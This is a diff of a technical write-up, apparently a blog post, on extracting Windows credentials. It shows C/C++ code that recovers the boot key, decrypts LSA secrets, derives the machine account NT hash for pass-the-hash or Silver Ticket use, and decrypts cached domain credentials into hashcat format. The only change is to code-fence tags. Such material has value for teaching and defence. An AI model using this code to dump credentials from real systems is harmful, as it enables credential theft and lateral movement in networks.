@@ -54,7 +54,7 @@ The **Boot Key** (also called the **LSA System Key**) is a 16-byte value that se
 
 The class name of a registry key is a rarely used attribute, most tools never display it, which makes it an effective *hiding* place. We can retrieve each fragment by calling `RegQueryInfoKeyW` with the `lpClass` parameter, and a `KeyHandle` on the registry key:
 
-```cpp
+```c++
 LPCWSTR KeyNames[] = { L"JD", L"Skew1", L"GBG", L"Data" };
 HKEY    KeyHandle;
 UCHAR   KeyParts[16];
@@ -79,7 +79,7 @@ Each class name is an 8-character hexadecimal string representing 4 bytes. `wcst
 
 The 16 bytes obtained from the four class names are **not** the Boot Key yet. Windows applies a fixed permutation to scramble them:
 
-```cpp
+```c++
 SystemKey[0]  = KeyParts[8];
 SystemKey[1]  = KeyParts[5];
 SystemKey[2]  = KeyParts[4];
@@ -134,7 +134,7 @@ DerivedKey = SHA-256(BootKey ‖ Salt ‖ Salt ‖ ... ‖ Salt)
 
 In code:
 
-```cpp
+```c++
 BOOLEAN Sha256Derive(PUCHAR Key, ULONG KeyLength, PUCHAR Salt, ULONG SaltLength, PUCHAR DerivedKey)
 {
     CryptAcquireContextA(&Provider, 0, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
@@ -162,7 +162,7 @@ This produces a 32-byte value suitable for use as an AES-256 key. The 1000 itera
 
 With the derived key in hand, the ciphertext portion of the blob (starting at offset 60) is decrypted using **AES-256 in ECB mode**:
 
-```cpp
+```c++
 UCHAR DerivedKey[LSA_KEY_SIZE]; // 32 bytes
 Sha256Derive(BootKey, SYSTEM_KEY_SIZE, BlobData + 28, 32, DerivedKey);
 
@@ -174,7 +174,7 @@ Aes256Decrypt(DerivedKey, Payload, PayloadLength);
 
 The `Aes256Decrypt` function imports the key as a `PLAINTEXTKEYBLOB` into the CryptoAPI, sets ECB mode, and calls `CryptDecrypt`:
 
-```cpp
+```c++
 BOOLEAN Aes256Decrypt(PUCHAR Key, PUCHAR Ciphertext, ULONG CiphertextLength)
 {
     // ... provider acquisition ...
@@ -206,7 +206,7 @@ Note the use of **ECB mode**: each 16-byte block is decrypted independently with
 
 The decrypted payload is not just a flat key, it is a nested structure of Windows internal types. The code navigates through three layers:
 
-```cpp
+```c++
 PNT6_CLEAR_SECRET clearSec   = (PNT6_CLEAR_SECRET)Payload;
 PNT6_SYSTEM_KEYS  keysStream = (PNT6_SYSTEM_KEYS)clearSec->Secret;
 PNT6_SYSTEM_KEY   firstKey   = (PNT6_SYSTEM_KEY)keysStream->Keys;
@@ -218,7 +218,7 @@ if (firstKey->KeySize >= LSA_KEY_SIZE) {
 
 The structures involved (stolen from Mimikatz's code, many thanks to the kiwi!) are:
 
-```cpp
+```c++
 typedef struct _NT6_CLEAR_SECRET {
     DWORD SecretSize;
     DWORD unk0, unk1, unk2;
@@ -252,7 +252,7 @@ LSA secrets are stored under `HKLM\SECURITY\Policy\Secrets`. Each secret is a su
 
 Each of these holds a binary blob as its default value. We enumerate all secrets:
 
-```cpp
+```c++
 VOID DumpLsaSecrets(HKEY HklmHandle, PUCHAR LsaKey)
 {
     RegOpenKeyExW(HklmHandle, L"SECURITY\\Policy\\Secrets",
@@ -284,7 +284,7 @@ VOID DumpLsaSecrets(HKEY HklmHandle, PUCHAR LsaKey)
 
 Each secret blob has the same 60-byte header structure as PolEKList: a salt at offset 28, and the ciphertext starting at offset 60. The decryption process is identical, derive an AES-256 key using the LSA key and the per-secret salt, then decrypt with AES-256-ECB:
 
-```cpp
+```c++
 static VOID DecryptAndPrintSecret(PCWSTR DisplayName, PUCHAR LsaKey,
                                    PUCHAR BlobData, ULONG BlobLength)
 {
@@ -322,7 +322,7 @@ After AES-256-ECB decryption, the plaintext has a simple structure:
 
 When the secret is `$MACHINE.ACC`, then we go one step further and compute the **NT hash** (MD4) of the raw password bytes, since that is what is needed for pass-the-hash or Silver Ticket attacks:
 
-```cpp
+```c++
 if (_wcsicmp(DisplayName, L"$MACHINE.ACC [CurrVal]") == 0)
 {
     UCHAR NtHash[MD4_DIGEST_LENGTH];
@@ -341,7 +341,7 @@ if (_wcsicmp(DisplayName, L"$MACHINE.ACC [CurrVal]") == 0)
 
 The `ComputeMd4` function uses the legacy CryptoAPI with `CALG_MD4`:
 
-```cpp
+```c++
 BOOLEAN ComputeMd4(PUCHAR Input, ULONG InputLength, PUCHAR Digest)
 {
     CryptAcquireContextA(&Provider, 0, 0, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
@@ -371,7 +371,7 @@ Decrypting them requires a specific key, `NL$KM`, which is itself an LSA secret.
 
 The `NL$KM` key is extracted just like any other LSA secret, through `GetNlkmKey`:
 
-```cpp
+```c++
 static LSTATUS GetNlkmKey(HKEY HklmHandle, PUCHAR LsaKey, PUCHAR NlkmKey)
 {
     // Open SECURITY\Policy\Secrets\NL$KM\CurrVal
@@ -401,7 +401,7 @@ The result is a **16-byte AES-128 key** that will be used to decrypt each cached
 
 Before decrypting individual entries, we read the PBKDF2 iteration count from `SECURITY\Cache\NL$IterationCount`:
 
-```cpp
+```c++
 DWORD IterationCount = 10240; // default
 RegQueryValueExW(CacheKey, L"NL$IterationCount", NULL, NULL,
                  (LPBYTE)&IterationCount, &IcSize); // A if check could be interesting here, to not fallback in the next else, in case of reading error
@@ -418,7 +418,7 @@ This iteration count is not used for the decryption itself, it was used when the
 
 We iterate over `NL$1` through `NL$25`. Each entry is a binary blob whose fixed-size header is an `NL_RECORD` structure (96 bytes):
 
-```cpp
+```c++
 #pragma pack(push, 1)
 typedef struct _NL_RECORD {
     USHORT    UserLength;               // 0x00
@@ -449,7 +449,7 @@ The encrypted data follows immediately after the 96-byte header.
 
 The filtering and decryption logic:
 
-```cpp
+```c++
 for (ULONG Index = 1; Index <= 25; Index++)
 {
     // Read NL$1 through NL$25
@@ -487,7 +487,7 @@ After decryption, the plaintext has the following layout:
 
 We extract the username and domain, lowercase the username (DCC2 hashes are computed with a lowercased username), and format the output in hashcat-compatible format:
 
-```cpp
+```c++
 PUCHAR Hash = Plaintext;  // first 16 bytes
 
 // Extract username at offset 0x48
